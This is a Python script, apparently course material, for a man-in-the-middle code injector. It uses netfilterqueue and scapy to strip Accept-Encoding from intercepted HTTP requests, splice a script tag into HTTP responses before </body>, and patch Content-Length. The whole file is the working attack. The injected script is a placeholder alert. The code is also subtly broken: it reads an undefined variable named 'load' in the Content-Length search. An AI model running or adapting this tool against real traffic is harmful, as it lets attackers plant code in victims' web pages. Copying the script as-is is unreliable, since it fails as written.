#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import re

# packet.accept() -> Let the packet flow to the correct destination
# packet.drop()   -> Drop the packet

def set_load(packet, load):
    packet[scapy.Raw].load = load

    # We need to delete these since we modified the size of our packet.
    # Scapy will automatically recalculate the size so we can leave it empty.
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    #  Inspect this packet: print(scapy_packet.show())

    if scapy_packet.haslayer(scapy.Raw):
        packet_load = scapy_packet[scapy.Raw].load

        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] GET Request")
            packet_load = re.sub("Accept-Encoding:.*?\\r\\n", "", packet_load)
            new_packet = set_load(scapy_packet, packet_load)
            packet.set_payload(str(new_packet))
            print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Replacing file")
            injection_code = "<script>alert('test')</script>"
            packet_load = packet_load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d+)", load)

            if content_length_search:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                packet_load = packet_load.replace(content_length, str(new_content_length))

            new_packet = set_load(scapy_packet, packet_load)
            packet.set_payload(str(new_packet))
            print(scapy_packet.show())


    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
